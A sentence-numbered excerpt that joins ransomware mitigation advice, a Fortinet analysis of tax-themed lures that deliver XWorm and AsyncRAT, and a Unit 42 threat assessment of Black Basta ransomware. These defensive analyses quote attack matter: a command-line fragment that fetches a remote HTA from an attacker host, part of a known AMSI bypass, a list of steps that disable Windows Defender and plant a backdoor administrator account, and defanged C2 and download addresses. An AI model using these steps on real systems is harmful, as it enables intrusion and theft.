sentence.1340: Configure firewall in following way,Deny access to Public IPs to important ports (in this case RDP port 3389)Allow access to only IP’s which are under your control.
sentence.1341: Use VPN to access the network, instead of exposing RDP to the Internet.
sentence.1342: Possibility implement Two Factor Authentication (2FA).Set lockout policy which hinders credentials guessing.
sentence.1343: Create a separate network folder for each user when managing access to shared network folders.
sentence.1344: Take regular data backup Protect systems from ransomware by periodically backing up important files regularly and keep a recent backup copy offline.
sentence.1346: If your computer gets infected with ransomware, your files can be restored from the offline backup once the malware has been removed.
sentence.1347: Always use a combination of online and offline backup.
sentence.1348: Do not keep offline backups connected to your system as this data could be encrypted when ransomware strike.
sentence.1349: Keep software updated Always keep your security software (antivirus, firewall, etc.)
sentence.1350: up to date to protect your computer from new variants of malware.
sentence.1351: Regularly patch and update applications, software, and operating systems to address any exploitable software vulnerabilities.
sentence.1352: Do not download cracked/pirated software as they risk backdoor entry for malware into your computer.
sentence.1353: Avoid downloading software from untrusted P2P or torrent sites.
sentence.1354: In most cases, they are malicious software.
sentence.1355: Having minimum required privileges Don’t assign Administrator privileges to users.
sentence.1356: Most importantly, do not stay logged in as an administrator unless it is strictly necessary.
sentence.1357: Also, avoid browsing, opening documents, or other regular work activities while logged in as an administrator.
sentence.1358: Monitor for Lateral Movement To spot these attacks, keep an eye out not only for attack code but also monitor for any evidence of lateral movement and data exfiltration within the environment.
sentence.1359: To determine if an organization has been hit by Nefilim, check remote-access systems for any signs of unauthorized access.
sentence.1360: To identify potential data exfiltration, additionally identify unusual host outbound traffic patterns.

sentence.1363: title: Deja Vu All Over Again: Tax Scammers at Large url: https://www.fortinet.com/blog/threat-research/tax-scammers-at-large Affected Platforms: WindowsImpacted Users: Windows usersImpact: Compromised machines are under the control of the threat actor, potentially resulting in stolen personally identifiable information (PII), credential theft, financial loss, etc.Severity Level:
sentence.1364: Medium The time has come again for tax returns—and tax-based scams.
sentence.1365: Targeting calendar-based events enables threat actors to prepare ahead of time and have a new selection of targets on rotation.
sentence.1366: This blog covers a few examples of malware that take advantage of tax season.
sentence.1367: Although such attacks may seem repetitive to the casual observer, threat actors would not continue to target taxpayers if previous attacks had not been successful.
sentence.1368: XWorm Delivered Through Tax Scam FortiGuard Labs became aware of a curious-looking archive file hosted on an open directory on www[.]farmaciasmv[.]com/citrix/2022%20tax_documents[.]zip, which has since been removed.
sentence.1371: The zip file contains the following files: Annual Withdrawal.xlsx (SHA2: 59bb292565ebc86800e5e4d625d3c19f98afe2261d3da1a8e2f9b45ec76153a0) Robert tax_docs.pdf (SHA2: a9f4b054ea128529c62a8ff25f1439651f045e443adf5ff11fb5bd29f1333a7a) Figure 2.
sentence.1372: Contents of the 2022%20tax_documents[.]zip The XLSX file is a benign decoy file that contains financial data from an unknown source.
sentence.1374: Contents of the Annual Withdrawal.xlsx The other file is malicious.
sentence.1375: Despite Robert tax_docs.pdf having a PDF icon, it is different from what it seems.
sentence.1376: The file is actually a link (LNK) file that launches the legitimate script (C:\Windows\System32\SyncAppvPublishingServer.vbs), which has a known issue of taking command line arguments.
sentence.1377: The link file exploits this issue and feeds the legitimate script with the following command line argument to download and execute a remote “note.hta”: ;\W_\*2\\\m_h_a_e ('http'+'://datacenter002[.]myftp[.]biz/documents/note.
sentence.1379: The downloaded note.hta uses PowerShell to download another remote file hosted on hxxp://datacenter002[.]myftp[.]biz/documents/note[.]gif, which was not available at the time of our investigation.
sentence.1380: Finding another note.gif (SHA2: 0487ef401345aa17c6aaeac23151219863e1363f82fe76edd0066bbf3fb07715) based on the same infection chain let us continue our quest to the payload.
sentence.1381: note.gif is a PowerShell script that creates the following files: C:\Users\Public\onedrive.vbs (SHA2: 92C1767EE4A954B93D6AFA9AE83FE82B82D2867D919D0359DCF2C8DA75FB8C7C)
sentence.1382: C:\Users\Public\test.vbs (SHA2: ADBA59F1495965684EEB4C5DAAD67F732FEB5E9183AE05EB869E20C88CAD7327) C:\Users\Public\onedrive.ps1 (SHA2: 7A9705A424A634A321DB9F36B61D74B953A44D44EDC429F7641BF830870572FC) Once launched, it executes the onedrive.vbs and test.vbs files.
sentence.1383: test.vbs creates %usertemp%\Note.txt, a clean file containing fake "QUARTERLY TAX PAYMENTS FOR 2022" data. Figure 4.
sentence.1384: Note.txt containing fake “QUARTERLY TAX PAYMENTS FOR 2022” data onedrive.vbs runs the previously created onedrive.ps1 filled with activities designed to hamper Windows Defender.
sentence.1385: It first executes the following known AMSI (Antimalware Scripting Interface) bypass:
sentence.1390: .GetField(‘amsiInitFailed’,’NonPublic,Static’).SetValue($null,$true) It also disables AMSI by hijacking the COM server, changing it from "%windir%\system32\amsi.dll" to "C:\IDontExist.dll".
sentence.1391: The PowerShell script then performs the following actions to alter Windows Defender settings: Adds the following exclusions to Windows DefenderExtensions: .bat, .ppam, .xls, .docx, .bat, .exe, .vbs, .js
sentence.1392: File paths: C:\, D:\, E:\ Processes: explorer.exe, kernel32.dll, aspnet_compiler.exe, cvtres.exe, CasPol.exe, csc.exe, Msbuild.exe, ilasm.exe, InstallUtil.exe, jsc.exe, Calc.exe, powershell.exe, rundll32.exe, conhost.exe, Cscript.exe, mshta.exe, cmd.exe, DefenderisasuckingAntivirus, wscript.exe Allows known Windows Defender Threat IDs to execute Disables Windows Defender Attack Surface Reduction (ASR) rules Disables the following Windows Defender features:Intrusion Prevention System IO AV Protection (does not scan downloaded files and attachments)
sentence.1393: Realtime monitoring Script scanning Controlled folder access protection PUA protection Scheduled scan Sets Network Protection to audit mode in Windows Defender (allows users to visit known malicious sites but logs them in the event log)
sentence.1394: Disables MAPS (Microsoft Active Protection Service) reporting Never submits samples to Microsoft Allows severe/high/moderate/low-level threats to execute Disables the "administrator in Admin Approval Mode" user type (disables UAC prompts) Stops the WinDefend service (Windows Defender) Disables the startup of the WinDefend service Deletes the WinDefend service Creates a user named "System32" with the password “123” (no quotes) Adds the System32 user to both the "administrators" group and the "Remote Desktop Users" group Stops the Microsoft Defender Antivirus Network Inspection Service (WdNisSvc) Turns off Windows Firewall The PowerShell script finally uses reflective loading to load a binary into memory that injects XWorm RAT version 3.1.
sentence.1395: Furthermore, we discovered other files that follow a similar attack pattern; “Mary tax docs.pdf.lnk” (SHA2: 6dee21d581eac2214e3ea7259bf9cb3e0cc31b442a372ffba00f82aa858050f0) and “Wilson tax_docs.pdf.lnk” (SHA2: c06cf72149d52b8a7c73b38c075156df4c458f633c3031c3c0ce32741ad1518e) that were used in March 2023.
sentence.1396: As with the attack mentioned previously, these link files are disguised as PDF files to fool potential victims into opening them.
sentence.1397: “Mary tax docs.pdf.lnk”, along with another clean Microsoft Office file, “R&P Sales Summary.docx”, are included in an archived file labeled “2022 tax docs.zip”.
sentence.1398: Running the link file triggers the download and execution of “doc.pdf” from “hxxp://datacenter11[.]myftp[.]org/notepad/”.
sentence.1399: The “doc.pdf” is actually a VBA file that uses PowerShell to pull and run “hxxp://datacenter11[.]myftp[.]org/met/a[.]mp3”.
sentence.1400: While the “a.mp3” is not available for investigation, OSINT (Open Source Intelligence) indicates that the XWorm malware is likely delivered to the victim’s machine.
sentence.1401: XWorm From the evidence that FortiGuard Labs accumulated during our research, we have high confidence that the 2022%20tax_documents[.]zip file we initially analyzed delivers the XWorm.
sentence.1402: XWorm is a commodity RAT (Remote Access Trojan) reportedly sold in underground forums for $30 to $150.
sentence.1403: XWorm supports typical RAT functions, such as taking screenshots, keylogging, and taking control of a compromised machine by abusing Virtual Network Computing (VNC), a technique infamously known as Hidden VNC (HVNC).
sentence.1404: XWorm can also encrypt files, essentially acting in a similar fashion to ransomware.
sentence.1405: Here are screenshots of a recently cracked version of XWorm v3.1: Figure 5.
sentence.1406: Leaked cracked version of XWorm v3.1 Figure 6.
sentence.1407: Some of the functionalities supported by XWorm v3.1 Figure 7.
sentence.1408: Download page of the cracked version of XWorm v.3.1 Going back to the first example, “2022%20tax_documents[.]zip”, we found that it was hosted on the open directory “www[.]farmaciasmv[.]com/citrix/”.
sentence.1409: We also found another page on the same domain likely used for phishing hxxp://farmaciasmv[.]com/sharefile/citrix/2022%20taxes[.]html.
sentence.1410: The files involved in this attack were submitted to VirusTotal.
sentence.1411: We don’t believe victims just wander into such malicious sites by accident.
sentence.1412: Based on our experience, they were likely lured via malicious links in spam emails.
sentence.1413: Manual interactions are required up until the files inside the zip file are extracted, and the link file is manually run.
sentence.1414: The basic security practice of not opening files from unknown sources can prevent infection and the damages that follow.
sentence.1415: Dual Malware Wielding Another tax-related attack FortiGuard Labs came across is an image file named “TaxReturn2022.img” (SHA2: 6658d4b14f0093a2fccd2f57b5bf9fa18d09cda5d42036f280b41e5beb1ff2fe) that contains the following files:
sentence.1417: We were able to locate another file, “TaxReturns2022.iso” (SHA2: bb7138a106ee2e0a384896316679c750e3287b51fc16a5e65ccd1e44911162d6), that contains identical files.
sentence.1420: Contents of TaxReturns2022.iso Unfortunately, the infection vector for both files has not been identified, but the likely attack avenue is an email containing malicious attachments and links.
sentence.1421: The TaxReturns2022.zip file within both archives is password-protected with an unknown password, and its contents cannot be extracted.
sentence.1422: As with the previous example, “TaxReturn2022.pdf.lnk” has a PDF icon.
sentence.1423: However, it’s a link (shortcut) file, as seen in Figure 4.
sentence.1424: Manually executing the lnk file triggers the download of wed.hta from hxxp://179.43.175[.]187/pqpf/ and saves it as %USERAPPDATA%\wed.hta (SHA2: 0cbaf95b9d4df27442d753dc4cb600eda0a7ecb95e4071f380f69f5f3c89adb1).
sentence.1425: The downloaded file is an HTA web file containing VBScript code for the next action and a lot of junk code.
sentence.1427: UnRestricted [powershell code This PowerShell code is designed to execute whatever was downloaded.
sentence.1428: In this case, it downloads “TaxReturn2022.pdf” from hxxp://179.43.175[.]187/pqpf/, saves it as %USERAPPDATA%\TaxReturn2022.pdf, and opens it.
sentence.1429: Unfortunately, this PDF file is a clean decoy file that also requires an unidentified password to open.
sentence.1430: The PowerShell code sets the following registry entry to open the downloaded PDF file every time the computer boots and adds the HIDDEN file attribute to the file:
sentence.1433: This behavior led us to believe that the threat actor behind this attack relies on templates and uses them without really knowing what they are because there is no valid reason to open a decoy PDF file at every startup, and adding the HIDDEN file attribute is usually reserved for executables and DLLs.
sentence.1434: The script then sleeps five seconds before downloading and executing whatever has been downloaded.
sentence.1435: In this case, it downloads TCywxTOvZk.wsf from hxxp://[redacted].67[.]12:222/ and saves it as %USERAPPDATA%\TCywxTOvZk.wsf (SHA2: 351b0514feaa6a2fc21af25ad7c6c9bed93e38ef896d3fb6c8633924d8615e2d).
sentence.1436: Note that part of the IP address masked as the directory is accessible.
sentence.1437: TCywxTOvZk.wsf has only three meaningful lines of code out of almost 2840 lines and downloads and runs hxxp://[redacted].67[.]12:222/no[.]txt (SHA2: d7c63c4d488918aa09fcbd2012d041ed440377af51a87e757c40df3725b1eb07).
sentence.1438: no.txt contains VBScript code that downloads and executes hxxp://[redacted].67[.]12:222/j[.]png (SHA2: 460d093a55b930e733c60575f82183cd0edd52ec6b927cdb4a93dc5da7f0ac9c), which is a PowerShell script that creates the following files: C:\ProgramData\Document\py.ps1 C:\ProgramData\schtasks\Microsoft.bat C:\ProgramData\Document\x.ps1 The script then runs Microsoft.bat, which uses MSHTA.exe to run PowerShell code to run py.ps1.
sentence.1439: The .ps1 file contains two PE files (stored in $apprun and $appme).
sentence.1440: It uses 'C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe' to reflectively load $apprun, which then loads $appme, which was identified as an ASync RAT variant that connects to the attacker’s Command-and-Control (C2) server located at nulled2nd[.]camdvr[.]org:6666.
sentence.1441: We also found another .lnk file (SHA2: c0a59b28919282b3c45a9619410ea95e35f86dbf43266e6f9a25b94f5948018b) hidden in TaxReturns2022.pdf.iso (SHA2: ee1299f4e56c7f5af243df63192f1c7574152c0600edc49c37b9f8b703da02f2).
sentence.1442: This link file goes through the same infection chain as the previous one:
sentence.1443: The link file downloads and executes hxxp://[redacted].67[.]12:222/xa[.]hta xa[.]hta downloads and executes hxxp://[redacted].67[.]12:222/qDxcmqPPmI[.]wsf qDxcmqPPmI.wsf was not available at the time of the investigation.
sentence.1444: However, OSINT led us to find the next action.
sentence.1445: qDxcmqPPmI[.]wsf downloads and executes hxxp://[redacted].67[.]12:222/no[.]txt no[.]txt downloads and executes hxxp://[redacted].67[.]12:222/j[.]png j.png creates py.ps1 and x.ps1.
sentence.1446: It also creates and runs Microsoft.bat Microsoft.bat runs py.ps1, which eventually installs Async RAT on the compromised machine Curiously the attacker left the hosting location of the malicious files wide open.
sentence.1448: Files hosted on the attacker’s open directory
sentence.1449: The directory contains a few files whose names are associated with Adobe Acrobat Reader DC.
sentence.1450: This indicates that the threat actor also leverages Adobe as a lure to install the AsyncRAT variant.
sentence.1451: readerdc64_en_l_cra_mdr_install_update.exe[.]lnk (SHA2: 653fcea661d8f7d996210dcdbcad110f0dcca8e7bbc906bb0a4d12e3ab674483) readerdc64_en_l_cra_mdr_install_update[.]exe (SHA2: 1b012d01c86be5d68959504d362c52170b27d726cf2943e2e0250506a29c765a) – this is a legitimate Adobe Acrobat Reader DC installer.
sentence.1452: reader64[.]hta (SHA2: 3b2e776ab44a711a52de88b02c007897eed137b62ecc7fb51bbb3089941bda1a) readerdc64_en_ka_cra_mdr_install_update[.]wsf (SHA2: d2f0995f9184170386360d5eb5990e38a289052e6a15706613c9568a207da7d7) AsyncRAT contains features designed to steal information from compromised machines and a clipper feature that monitors the clipboard for crypto wallet address swapping, which means victims may end up paying more than their taxes.
sentence.1453: But however potential victims end up with the “TaxReturn2022.img” and “TaxReturns2022.pdf.iso” files on their system, users still need to manually mount them and run the fake PDFs to trigger the infection chain.
sentence.1454: A little caution can go a long way toward protecting yourself against tax-related malware.
sentence.1455: Conclusion The attacks covered in this blog are the tip of the iceberg.
sentence.1456: Attackers make every attempt to scam taxpayers for financial gain and data exfiltration for future attacks.
sentence.1457: In the end, those looking to save a dime, in this case, from Uncle Sam, often find that greed endangers them in the cyber world.
sentence.1458: For additional information, please refer to the “Tax Scams/Consumer Alerts” alert issued by the IRS for other tips on protecting yourself from tax-related scams.
sentence.1459: Fortinet Protection FortiGuard AntiVirus detects the malicious files identified in this report with the following signatures: JS/Agent.7593!tr JS/Agent.
sentence.1460: GDRU!tr LNK/Agent.1eb5!tr.dldr LNK/Agent.3aad!tr.dldr LNK/Agent.412e!tr.dldr LNK/Agent.9982181!tr LNK/Agent.
sentence.1467: YNY!tr.dldr W32/PasswordProtected.829D!tr The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR.
sentence.1468: Customers running current AntiVirus updates are protected.
sentence.1469: The FortiGuard Web Filtering Service detects the download URLs cited in this report as Malicious and blocks them.
sentence.1470: Due to the ease of disruption, damage to daily operations, potential impact to an organization's reputation, and the unwanted destruction or release of PII, etc., it is essential to keep all AV and IPS signatures current.
sentence.1471: If you believe this or any other cybersecurity threat has impacted your organization, please contact our Global FortiGuard Incident Response Team.
sentence.1473: title: Threat Assessment: Black Basta Ransomware url: https://unit42.paloaltonetworks.com/threat-assessment-black-basta-ransomware/ Executive Summary Black Basta is ransomware as a service (RaaS) that first emerged in April 2022.
sentence.1474: However, evidence suggests that it has been in development since February.
sentence.1475: The Black Basta operator(s) use the double extortion technique, meaning that in addition to encrypting files on the systems of targeted organizations and demanding ransom to make decryption possible, they also maintain a dark web leak site where they threaten to post sensitive information if an organization chooses not to pay ransom.
sentence.1476: Black Basta affiliates have been very active deploying Black Basta and extorting organizations since the ransomware first emerged.
sentence.1477: Although the Black Basta affiliates have only been active for the past couple of months, based on the information posted on their leak site, they have compromised over 75 organizations at the time of this publication.
sentence.1478: Unit 42 has also worked on several Black Basta incident response cases.
sentence.1479: The ransomware is written in C++ and impacts both Windows and Linux operating systems.
sentence.1480: It encrypts users’ data using a combination of ChaCha20 and RSA-4096, and to speed up the encryption process, the ransomware encrypts in chunks of 64 bytes, with 128 bytes of data remaining unencrypted between the encrypted regions.
sentence.1481: The faster the ransomware encrypts, the more systems can potentially be compromised before defenses are triggered.
sentence.1482: It is a key factor affiliates look for when joining a Ransomware-as-a-Service group.
sentence.1483: Palo Alto Networks customers receive help with detection and prevention of Black Basta ransomware through the following products and services: Cortex XDR and Next-Generation Firewalls (including cloud-delivered security services such as WildFire).
sentence.1484: If you think you may have been impacted by a cyber incident, the Unit 42 Incident Response team is available 24/7/365.
sentence.1485: You can also take preventative steps by requesting any of our cyber risk management services.
sentence.1486: Table of Contents Black Basta Overview Black Basta is ransomware as a service (RaaS) that leverages double extortion as part of its attacks.
sentence.1487: The attackers not only execute ransomware but also exfiltrate sensitive data and threaten to release it publicly if the ransom demands are not met.
sentence.1488: The threat actors behind the ransomware deploy a name-and-shame approach to their victim, where they use a Tor site, Basta News, to list all of the victims who have not paid the ransom.
sentence.1489: Although the Black Basta RaaS has only been active for a couple of months, according to its leak site, it had compromised over 75 organizations at the time of this publication.
sentence.1490: At least 20 victims were posted to its leak site in the first two weeks of the ransomware’s operation, which indicates the group likely is experienced in the ransomware business and has a steady source of initial access.
sentence.1491: It is also possible that this is not a new operation but rather a rebrand of a previous ransomware group that brought along their affiliates.
sentence.1492: Based on multiple similarities in tactics, techniques and procedures (TTPs) - victim-shaming blogs, recovery portals, negotiation tactics, and how quickly Black Basta amassed its victims - that the Black Basta group could include current or former members of the Conti group.
sentence.1493: Unit 42 has observed ​​the Black Basta ransomware group using QBot as an initial point of entry and to move laterally in compromised networks.
sentence.1494: QBot, also known as Qakbot, is a Windows malware strain that started as a banking trojan and evolved into a malware dropper.
sentence.1495: It has been used by other ransomware groups, including MegaCortex, ProLock, DoppelPaymer and Egregor.
sentence.1496: While these ransomware groups used QBot for initial access, the Black Basta group was observed using it for both initial access and to spread laterally throughout the network.
sentence.1497: Figure 1 below shows the standard attack lifecycle observed with Black Basta ransomware.
sentence.1499: Black Basta attack lifecycle based on Unit 42 incident response cases.
sentence.1500: Technical Details Black Basta is written in C++ and is cross-platform ransomware that impacts both Windows and Linux systems.
sentence.1501: In June 2022, a VMware ESXi variant of Black Basta was observed targeting virtual machines running on enterprise Linux servers.
sentence.1502: The ransomware includes anti-analysis techniques that attempt to detect code emulation or sandboxing to avoid virtual/analysis machine environments.
sentence.1503: It also supports the command line argument -forcepath that is used to encrypt files in a specified directory.
sentence.1504: Otherwise, the entire system, except for certain critical directories, is encrypted.
sentence.1505: The ransomware spawns a mutex with a string of dsajdhas.0 to ensure a single instance of the malware is running at a time.
sentence.1506: Then it will iterate through the entire file system, encrypting files with a file extension of .basta.
sentence.1507: Black Basta ransomware encrypts users’ data through a combination of ChaCha20 and RSA-4096.
sentence.1508: To speed up the encryption process, the ransomware encrypts in chunks of 64 bytes, with 128 bytes of data remaining unencrypted between the encrypted regions.
sentence.1509: The ransomware also attempts to delete shadow copies and other backups of files using vssadmin.exe, a command-line tool that manages Volume Shadow Copy Service (VSS), which captures and copies stable images for backups on running systems.
sentence.1510: It writes the Random-letters.ico and Random-letters.jpg files to the %TEMP% directory.
sentence.1511: The .jpg file is leveraged to overwrite the desktop background and appears as follows: Figure 2.
sentence.1513: It adds a custom icon to the registry, corresponding to the .basta icon, which is shown in Figure 3.
sentence.1516: It will then boot the system in safe mode and proceed to encrypt files.
sentence.1517: Following successful encryption, the file’s extension is changed to .basta
sentence.1518: and the ransomware will write numerous instances of readme.txt, which contains the following ransom note: Figure 4.
sentence.1520: Tactics, Techniques and Procedures We have observed Black Basta affiliates leveraging the following TTPs: Tactic / Technique Notes TA0001 Initial Access T1566.001.
sentence.1522: Spear phishing Attachment Victims receive spear phishing emails with attached malicious zip files - typically password protected.
sentence.1523: That contains malicious doc including .doc, .pdf, .xls TA0002 Execution T1569.002.
sentence.1524: System Services: Service Execution Black Basta has installed and used PsExec to execute payloads on remote hosts.
sentence.1526: Windows Management Instrumentation Utilizes Invoke-TotalExec to push out the ransomware binary. T1059.001.
sentence.1528: PowerShell Black Basta has encoded PowerShell scripts to download additional scripts.
sentence.1530: Create Account Black Basta threat actors created accounts with names such as temp, r, or admin. T1098.
sentence.1531: Account Manipulation Added newly created accounts to the administrators' group to maintain elevated access. T1543.003.
sentence.1533: Windows Service Creates benign-looking services for the ransomware binary. T1574.001.
sentence.1534: Hijack Execution Flow: DLL Search Order Hijacking Black Basta used Qakbot, which has the ability to exploit Windows 7 Calculator to execute malicious payloads.
sentence.1537: Group Policy Modification Black Basta can modify group policy for privilege escalation and defense evasion. T1574.001.
sentence.1538: Hijack Execution Flow: DLL Search Order Hijacking Black Basta used Qakbot, which has the ability to exploit Windows 7 Calculator to execute malicious payloads. T1543.003.
sentence.1539: Windows Service Creates benign-looking services for the ransomware binary.
sentence.1541: Group Policy Modification Black Basta can modify group policy for privilege escalation and defense evasion. T1218.010.
sentence.1542: System Binary Proxy Execution: Regsvr32 Black Basta has used regsvr32.exe to execute a malicious DLL. T1070.004.
sentence.1543: Indicator Removal on Host: File Deletion Attempts to delete malicious batch files.
sentence.1545: Modify Registry Black Basta makes modifications to the Registry.
sentence.1547: Deobfuscate/Decode Files or Information Initial malicious .zip file bypasses some antivirus detection due to password protection.
sentence.1549: Impair Defenses: Disable or Modify Tools Disables Windows Defender with batch scripts, such as d.bat or defof.bat.
sentence.1551: Impair Defenses: Disable or Modify System Firewall Uses batch scripts, such as rdp.bat or SERVI.bat, to modify the firewall to allow remote administration and RDP.
sentence.1553: Impair Defenses: Safe Boot Mode Uses bcdedit to boot the device in safe mode. T1574.001.
sentence.1554: Hijack Execution Flow: DLL Search Order Hijacking Black Basta used Qakbot, which has the ability to exploit Windows 7 Calculator to execute malicious payloads. T1622.
sentence.1555: Debugger Evasion Uses IsDebuggerPresent to check if processes are being debugged.
sentence.1557: Credentials from Password Stores Black Basta uses Mimikatz to dump passwords.
sentence.1559: Account Discovery: Domain Account Used commands such as net user /domain and net group /domain. T1016.
sentence.1560: System Network Configuration Discovery Lists internal IP addresses to target in C:\Windows\pc_list.txt – typically found on the Domain Controller. T1082.
sentence.1561: System Information Discovery Uses GetComputerName to query the computer name.
sentence.1565: Remote Desktop Protocol Black Basta has used RDP for lateral movement.
sentence.1567: Archive Collected Data: Archive via Utility TA0010 Exfiltration T1567.
sentence.1568: Exfiltration over Web Service TA0011 Command and Control T1219.
sentence.1569: Remote Access Software Black Basta has installed and used legitimate tools such as TeamViewer and AnyConnect on targeted systems. T1573.
sentence.1570: Encrypted Channel Uses Qakbot primarily and Cobalt Strike.
sentence.1572: Data Encrypted for Impact Black Basta modifies the Desktop background by adding a .jpg in C:\Temp and creating a registry key HKCU\Control Panel\Desktop.
sentence.1573: Additionally modifies the registry to change the icon of encrypted files.
sentence.1574: It encrypts files excluding those with a .exe, .cmd, .bat and .com extension.
sentence.1575: Uses ChaCha20 or RSA-4096 to encrypt victims. T1489.
sentence.1576: Service Stop Uses sc stop and taskkill to stop services.
sentence.1578: Inhibit System Recovery Black Basta deletes Volume Shadow Copies using vssadmin.
sentence.1580: Tactics, techniques and procedures for Black Basta activity.
sentence.1582: The ransomware group and its affiliate program reportedly compromised multiple large organizations, in sectors including consumer and industrial products; energy, resources and agriculture; manufacturing; utilities; transportation; government agencies; professional services and consulting; and real estate.
sentence.1583: Black Basta operators also posted on dark web forums expressing interest in attacking organizations based in Australia, Canada, New Zealand, the U.K. and the U.S. Threat actors using the ransomware impacted organizations based in the U.S., Germany, Switzerland, Italy, France and the Netherlands (listed in descending order by numbers of allegedly breached organizations).
sentence.1585: Black Basta post on dark web forums.
sentence.1586: The threat actor(s) responsible for Black Basta operate a cybercrime marketplace and victim name-and-shame blog.
sentence.1587: This site is hosted as a Tor hidden service, where the Black Basta ransomware group lists their victims’ names, descriptions, percentage of stolen data which has been published, number of visits and any data exfiltrated.
sentence.1588: There were 75 victims listed on the leak site at the time of writing.
sentence.1590: Black Basta News site where the threat actors post allegedly breached organizations (details redacted) and number of visits.
sentence.1591: Courses of Action Several adversarial techniques were observed in activity associated with Black Basta, and the following measures are suggested within Palo Alto Networks products and services to mitigate threats related to Black Basta ransomware, as well as other malware using similar techniques: Product / Service Course of Action Initial Access
sentence.1592: The below courses of action mitigate the following techniques: Spear Phishing Attachment [T1566.001] THREAT PREVENTION Ensure that antivirus profiles are set to block on all decoders except 'imap' and 'pop3' Ensure a secure antivirus profile is applied to all relevant security policies NEXT-GENERATION FIREWALLS Set up File Blocking CORTEX XDR PREVENT Configure Malware Security Profile CORTEX XSOAR Deploy XSOAR Playbook – Endpoint Malware Investigation Deploy XSOAR Playbook – Phishing Investigation –
sentence.1593: Generic V2 Execution The below courses of action mitigate the following techniques: Service Execution
sentence.1595: [T1047], PowerShell [T1059.001] NEXT-GENERATION FIREWALLS Ensure remote access capabilities for the User-ID service account are forbidden.
sentence.1596: Ensure that User-ID is only enabled for internal trusted interfaces Ensure 'Service setting of ANY' in a security policy allowing traffic does not exist Ensure that security policies restrict User-ID Agent traffic from crossing into untrusted zones Ensure that the User-ID service account does not have interactive logon rights Ensure that 'Include/Exclude Networks' is used if User-ID is enabled Ensure 'Security Policy' denying any/all traffic to/from IP addresses on Trusted Threat Intelligence Sources exists Ensure that the User-ID Agent has minimal permissions if User-ID is enabled Ensure application security policies exist when allowing traffic from an untrusted zone to a more trusted zone CORTEX XDR PREVENT Configure Restrictions Security Profile Persistence, Privilege Escalation, Defense Evasion
sentence.1597: The below courses of action mitigate the following techniques: Create Account
sentence.1600: [T1070.004], Disable or Modify Tools [T1562.001], Modify Registry
sentence.1603: [T1562.004], Windows Service [T1543.003], DLL Search Order Hijacking [T1574.001], Group Policy Modification

sentence.1615: Deploy XSOAR Playbook – Palo Alto Networks Endpoint Malware Investigation Conclusion Black Basta ransomware operators have been active since at least April 2022.
sentence.1616: Although their RaaS has only been active for the past couple of months it had compromised at least 75 organizations at the time of this publication.
sentence.1617: Due to the high-profile nature and steady stream of Black Basta attacks identified globally in 2022, the operators and/or affiliates behind the service likely will continue to attack and extort organizations.
sentence.1618: Palo Alto Networks helps detect and prevent Black Basta ransomware in the following ways: WildFire:
sentence.1619: All known samples are identified as malware.
sentence.1620: Cortex XDR: Identifies indicators associated with Black Basta.
sentence.1621: Anti-Ransomware Module blocks Black Basta encryption behaviors on Windows.
sentence.1622: Local Analysis detection for Black Basta binaries on Windows and Linux.
sentence.1623: Behavioral Threat Prevention prevents Black Basta behaviors.
sentence.1625: DNS Signatures detect the known C2 domains, which are also categorized as malware in Advanced URL Filtering.
